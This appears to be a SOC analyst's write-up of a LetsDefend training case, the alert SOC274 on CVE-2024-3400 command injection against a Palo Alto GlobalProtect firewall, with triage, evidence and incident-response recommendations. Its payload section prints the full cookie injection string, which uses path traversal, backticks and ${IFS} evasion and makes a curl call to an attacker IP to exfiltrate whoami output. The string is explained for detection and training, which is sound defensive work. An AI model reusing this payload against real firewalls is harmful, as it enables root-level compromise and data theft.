#  SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)

## Executive Summary

On April 18, 2024, the Security Operations Center (SOC) received a critical alert for the active exploitation of **CVE-2024-3400**, a command injection vulnerability, against the perimeter firewall **PA-Firewall-01** (172.16.17.139). The investigation confirmed that an external attacker from IP **144.172.79.92** successfully achieved unauthenticated Remote Code Execution (RCE) by embedding a malicious command within a cookie sent to the GlobalProtect service. Endpoint logs on the firewall itself show the successful execution of the attacker's payload. As the device was not blocking the attempt, it is considered **fully compromised at the root level**. This is a **True Positive** critical incident that requires immediate activation of the full Incident Response protocol.

## Incident Details

The initial alert was triggered by a request matching the specific exploit pattern for CVE-2024-3400:

<img width="1520" height="496" alt="image" src="https://github.com/user-attachments/assets/9401e746-9b3d-48f5-9ffa-a13011da435e" />

| | |
| :--- | :--- |
| **Date of Incident** | April 18, 2024 |
| **Source IP Address** | 144.172.79.92 |
| **Destination Host** | PA-Firewall-01 (172.16.17.139) |
| **Attack Type** | Command Injection / Remote Code Execution (CVE-2024-3400) |
| **Vulnerable Component** | PAN-OS GlobalProtect (`/global-protect/login.esp`) |
| **Case Link** | [View Full Case on LetsDefend.io](https://app.letsdefend.io/case-management/casedetail/sohankanna/249) |

## Investigation and Analysis

### 1. Payload and Vulnerability Analysis

The attack vector was a malicious POST request sent to the firewall's GlobalProtect login page. The core of the attack is the command injection payload hidden within the `SESSID` cookie value.

<img width="648" height="372" alt="image" src="https://github.com/user-attachments/assets/b6943d2f-db9c-4791-81b4-b423277d4ec9" />

**Payload Breakdown:** `SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`

This payload is meticulously crafted to exploit the vulnerability:
*   **Directory Traversal (`./../../../`):** The initial part of the payload attempts to traverse the directory structure. In the context of CVE-2024-3400, this is used to create a file in a specific, predictable location on the filesystem.
*   **Command Substitution (`` ` ``):** The payload is enclosed in backticks. In a Linux shell, anything within backticks is executed as a command first, and its output replaces the backticked string. This is the core of the RCE.
*   **The Command (`curl...`):**
    *   `curl`: The attacker instructs the firewall to run the `curl` command, which is a tool for transferring data.
    *   `${IFS}`: This is a shell evasion technique. `${IFS}` is an "Internal Field Separator" that acts like a space but can bypass simple filters or Web Application Firewalls (WAFs) that are only looking for a literal space character.
    *   `144.172.79.92:4444`: This is the attacker's command-and-control (C2) server. The firewall is being instructed to initiate an outbound connection to this IP and port.
*   **Data Exfiltration (`?user=$(whoami)`):** This is a nested command. The `$(whoami)` command is executed *first* on the firewall. Its output (which would be the current username, likely `root`) is then appended to the URL. The final `curl` command effectively sends a web request like `http://144.172.79.92:4444?user=root`, immediately exfiltrating the user context to the attacker and confirming successful RCE.

### 2. Confirmation of Success

The attack was confirmed as successful through multiple pieces of evidence:
*   **Device Action: Allowed:** The alert itself shows that the malicious request was not blocked by the firewall's own security policies.
*   **Endpoint Log Confirmation:** Analysis of the process logs on the firewall itself shows the execution of the malicious `curl` command, spawned by the web service process. This is the "smoking gun" that proves the command was executed on the device.

    <img width="1189" height="761" alt="image" src="https://github.com/user-attachments/assets/ba534dc2-b4f8-4f6d-9e1f-bb388bf45cc3" />

### 3. Threat Intelligence

A check on the source IP `144.172.79.92` in VirusTotal confirms its malicious reputation, with multiple vendors flagging it. This indicates the IP is part of a known attack infrastructure.

<img width="1709" height="801" alt="image" src="https://github.com/user-attachments/assets/cfa09979-8b91-47a2-8285-a30baa8aa00d" />

## Skills and Tools Utilized

*   **Tools Used:** SIEM, EDR / Endpoint Security, VirusTotal
*   **Skills Demonstrated:** Command Injection Analysis, Vulnerability Triage (CVE-2024-3400), Log Correlation, Payload Deconstruction.

## Playbook Solution: Incident Classification

*   **Is Traffic Malicious?** **Yes.** It is a targeted exploit for a critical vulnerability.
*   **What Is The Attack Type?** **Command Injection** leading to **Remote Code Execution.**
*   **Was the Attack Successful?** **Yes.** The payload was processed, and the command was executed on the firewall.
*   **Do You Need Tier 2 Escalation?** **Yes.** This is a full compromise of a critical network security device.
*   **Incident Classification:** **True Positive.**

## Conclusion and Recommendations

The alert for SOC274 was a **true positive** for a successful and critical RCE attack against a perimeter firewall. The attacker exploited CVE-2024-3400 to gain root-level command execution. The firewall must be considered fully compromised and under attacker control, posing a catastrophic risk to the entire network.

**Recommendations:**

1.  **CONTAINMENT - Isolate Firewall Management:** Immediately restrict all access to the firewall's management interface. If possible, take the device offline for forensic imaging, but be aware this will cause a major network outage. Engage the network team immediately to plan for failover if available.
2.  **ESCALATE - Activate Full Incident Response Protocol:** Immediately escalate this incident to the Tier 2/IR team, network security team, and senior leadership.
3.  **INVESTIGATION:** A full forensic analysis of the firewall is mandatory. The IR team must determine what other commands were executed, if any persistence mechanisms (like backdoors or new admin accounts) were established, and if the attacker pivoted from the firewall into the internal network.
4.  **CREDENTIAL & KEY ROTATION:** All credentials, API keys, and certificates stored on the firewall must be considered compromised and must be rotated immediately.
5.  **ERADICATION & RECOVERY:** The firewall cannot be trusted. It must be completely wiped and rebuilt from a secure, trusted OS version and have its configuration redeployed from a known-good backup.
6.  **PATCHING:** Immediately identify and patch all other Palo Alto Networks devices in the environment vulnerable to CVE-2024-3400.
7.  **BLOCK INDICATORS:** Block the attacker's C2 IP address `144.172.79.92` on all perimeter devices.
